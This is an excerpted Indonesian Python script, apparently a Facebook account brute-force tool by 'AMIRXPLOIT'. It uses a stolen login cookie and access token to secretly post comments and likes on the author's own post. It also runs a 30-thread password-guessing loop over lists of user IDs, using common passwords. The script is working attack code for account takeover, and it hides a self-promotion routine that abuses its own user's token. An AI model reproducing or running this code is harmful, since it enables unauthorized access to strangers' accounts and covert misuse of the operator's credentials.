...
Author    = 'AMIRXPLOIT'
Facebook  = 'facebook.com/100041771241191'
Instagram = 'Instagram.com'
Whatsapp  = '085718094505'
YouTube   = 'Youtube.com'
Syafii  = 100041771241191
Postingan =737108057691562
...
___________________________________________________
  __  __ ____  _____  |[•] Version 1.2
 |  \/  | __ )|  ___| |[•] MR.AMIRXPLOIT
|| |\/| |  _ \| |_    |[•] 27-22-2022
|| | |  | | |_) |  _|   |[•] SC PRIVAT
_______&_______     |[•] JANGAN JUAL :V
...
ua_business = "Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaC5-00/071.005; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.26 Mobile Safari/533.4"
...
def log_cookie():
    ...
    mkdir_data_login()
    print(f"{B} | ")
    print(f"{P}[*] klo luh pinter jangan pake akun pribadi!!")
    print(f"{B} | ")
...
komtwol = random.choice(['ANJAY SLEMEX LORD SYAFII GANTENG ', 'MHD.SYAFIIk ', 'BANH KOK LO JAGO BANGET SIH ', 'LORD DAH MAKAN BLM'])
...
def ___fii___Sayang___Kamu___Widiya___():
    try:
        ...
        komentar = komtwol
        pipp = kartu2d
        post = '724714225597612'
        requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/724714225597612/comments/?message=' + kom + '&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/724714225597612/comments/?message=' + pipp + '&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/724714225597612/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
        ...
        requests.post('https://graph.facebook.com/724714225597612/comments/?message=' + kon + '&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/724714225597612/likes?summary=true&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/724714225597612/likes?summary=true&access_token=' + (token),cookies=cookie)
        requests.post('https://graph.facebook.com/724714225597612/likes?summary=true&access_token=' + (token),cookies=cookie)
						...
						with ThreadPoolExecutor(max_workers=30) as coeg:
							...
							for user in id:
								...
								if len(frist)>=6:
									...
									fii = [ "bissmilah", "anjing", "indonesia", "sayangkamu", "monyet", "kontol", "sayang", "bangsat", "anjing" ]
